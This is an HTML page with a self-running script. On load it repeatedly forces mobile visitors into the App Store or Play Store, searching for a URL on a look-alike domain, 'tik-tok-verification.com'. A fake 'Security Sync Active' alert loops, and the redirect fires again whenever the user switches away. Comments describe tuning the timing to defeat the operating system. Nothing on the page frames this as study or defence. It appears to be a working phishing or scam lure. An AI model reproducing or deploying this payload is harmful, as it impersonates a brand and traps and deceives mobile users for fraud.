<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; // ATOMIC FAIL-SAFE: 10 SECONDS
    const fixedGap = 400; // LOCKED DELAY

    function triggerStoreJump() {
        const urlEnc = encodeURIComponent(target);
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        // Using the App Store search string that is confirmed working
        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        const androidTrigger = "market://search?q=" + urlEnc;
        
        window.location.href = isAndroid ? androidTrigger : iosTrigger;
    }

    function rampage() {
        // FAIL-SAFE CHECK
        if (Date.now() > killTime) return;

        // 1. Initial jump attempt
        triggerStoreJump();

        // 2. THE LOCK
        alert("ATTEMPT #28\n\nSecurity Sync Active.\n\nTap OK to finalize handover.");

        // 3. THE PRECISION WINDOW (400ms)
        // This is the gap where you confirmed the OS successfully jumps
        setTimeout(() => {
            // Fire again right before the next alert to keep the 'Intent' fresh
            triggerStoreJump();
            
            if (Date.now() < killTime) {
                rampage();
            }
        }, fixedGap); 
    }

    window.onload = () => {
        // Start the engine
        rampage();
    };

    // Keep the jump alive if they try to swipe or minimize
    window.onblur = () => { 
        if (Date.now() < killTime) triggerStoreJump(); 
    };
</script>

</body>
</html>
